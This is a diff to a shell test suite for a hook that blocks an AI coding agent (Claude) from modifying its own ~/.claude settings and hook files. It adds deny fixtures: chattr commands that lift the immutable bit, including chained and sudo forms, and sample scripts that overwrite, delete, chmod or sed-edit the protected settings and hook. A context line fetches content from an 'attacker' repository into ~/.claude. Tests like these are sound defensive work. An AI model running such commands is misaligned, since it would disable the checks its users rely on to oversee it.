@@ -282,6 +282,95 @@ for f in "${PROT_FILES[@]}"; do
       "evil=\$(gh api 'repos/attacker/foo/contents/x'); good=\$(gh api 'repos/ConductionNL/.github/contents/global-settings/${base}'); printf '%s' \"\$evil\" > \"\$HOME/.claude/${f}\""
 done
 
+# ── v1.7.0 chattr guard ───────────────────────────────────────────────────────
+# Claude must never run chattr against any protected path. The user manages the
+# immutable bit themselves via sudo from their own terminal — which bypasses
+# this hook entirely.
+for f in "${PROT_FILES[@]}"; do
+    while IFS= read -r path; do
+        add_deny "chattr -i → ${path:0:30}...$f" "chattr -i ${path}"
+        add_deny "chattr +i → ${path:0:30}...$f" "chattr +i ${path}"
+        add_deny "chattr =i → ${path:0:30}...$f" "chattr =i ${path}"
+    done < <(path_variants "$f")
+    add_deny "chained chattr → $f"      "true && chattr -i \$HOME/.claude/${f}"
+    add_deny "sudo chattr → $f"          "sudo chattr -i \$HOME/.claude/${f}"
+done
+add_allow "chattr -i on /tmp/file"      "chattr -i /tmp/somefile"
+add_allow "chattr +i on /var/log/foo"   "chattr +i /var/log/foo"
+
+# ── v1.7.0 script-body scanner ────────────────────────────────────────────────
+# When the command invokes a script (bash <path>, sh <path>, source <path>,
+# . <path>, ./<path>), the hook reads the script body and re-checks it for
+# protected-path writes.
+SCRIPT_TMP=$(mktemp -d)
+# Extend the existing PUSH_TMP trap so both temp dirs are cleaned up together.
+# (Set after PUSH_TMP is created below; we register a final trap there.)
+
+# Bad scripts: each contains a write operation against a protected file.
+cat > "$SCRIPT_TMP/redirect.sh" <<'SCRIPT'
+#!/bin/bash
+echo evil > $HOME/.claude/settings.json
+SCRIPT
+cat > "$SCRIPT_TMP/cp_to_protected.sh" <<'SCRIPT'
+#!/bin/bash
+cp /tmp/evil ~/.claude/settings.json
+SCRIPT
+cat > "$SCRIPT_TMP/rm_protected.sh" <<'SCRIPT'
+#!/bin/bash
+rm $HOME/.claude/hooks/block-write-commands.sh
+SCRIPT
+cat > "$SCRIPT_TMP/chmod_protected.sh" <<'SCRIPT'
+#!/bin/bash
+chmod 644 $HOME/.claude/settings.json
+SCRIPT
+cat > "$SCRIPT_TMP/chattr_protected.sh" <<'SCRIPT'
+#!/bin/bash
+chattr -i $HOME/.claude/settings.json
+SCRIPT
+cat > "$SCRIPT_TMP/tee_protected.sh" <<'SCRIPT'
+#!/bin/bash
+echo evil | tee $HOME/.claude/settings.json
+SCRIPT
+cat > "$SCRIPT_TMP/sed_inplace.sh" <<'SCRIPT'
+#!/bin/bash
+sed -i 's/foo/bar/' $HOME/.claude/settings.json
+SCRIPT
+chmod 555 "$SCRIPT_TMP"/*.sh
+
+# Innocuous scripts: must allow.
+cat > "$SCRIPT_TMP/hello.sh" <<'SCRIPT'
+#!/bin/bash
+echo hello
+SCRIPT
+cat > "$SCRIPT_TMP/read_only.sh" <<'SCRIPT'
+#!/bin/bash
+# Mentions ~/.claude/settings.json in a comment and reads it, but never writes.
+cat $HOME/.claude/settings.json | head -5
+SCRIPT
+chmod 555 "$SCRIPT_TMP/hello.sh" "$SCRIPT_TMP/read_only.sh"
+
+# DENY: bad scripts invoked via each supported form.
+for s in redirect.sh cp_to_protected.sh rm_protected.sh chmod_protected.sh chattr_protected.sh tee_protected.sh sed_inplace.sh; do
+    add_deny "bash $s"          "bash $SCRIPT_TMP/$s"
+    add_deny "sh $s"            "sh $SCRIPT_TMP/$s"
+    add_deny "./$s direct"      "$SCRIPT_TMP/$s"
+    add_deny "source $s"        "source $SCRIPT_TMP/$s"
+    add_deny ". $s POSIX"       ". $SCRIPT_TMP/$s"
+    add_deny "true && bash $s"  "true && bash $SCRIPT_TMP/$s"
+done
+
+# ALLOW: innocuous scripts via each form.
+for s in hello.sh read_only.sh; do
+    add_allow "bash $s safe"        "bash $SCRIPT_TMP/$s"
+    add_allow "./$s direct safe"    "$SCRIPT_TMP/$s"
+    add_allow "source $s safe"      "source $SCRIPT_TMP/$s"
+done
+
+# ALLOW: nonexistent script path (false-positive guard — body scan silently no-ops).
+add_allow "bash <nonexistent>"      "bash /tmp/does-not-exist-fixture-$$.sh"
+# ALLOW: bash -c form (inline string, no file to scan; existing inline guards cover it).
+add_allow "bash -c innocuous"       'bash -c "echo hi > /tmp/ok"'
+
 # ── ASK fixtures ──────────────────────────────────────────────────────────────
 # Package manager installs — every form should prompt for approval, not pass silently.
 add_ask "npm install" "npm install lodash"
@@ -388,7 +477,7 @@ run_push_with_transcript() {
 }
 
 PUSH_TMP="$(mktemp -d)"
-trap 'rm -rf "$PUSH_TMP"' EXIT
+trap 'rm -rf "$PUSH_TMP" "${SCRIPT_TMP:-}"' EXIT
 
 # Layout A — bug fixture: user said "please git push", then Claude ran a tool
 # (one tool_result entry now sits as the most recent user-role message). The
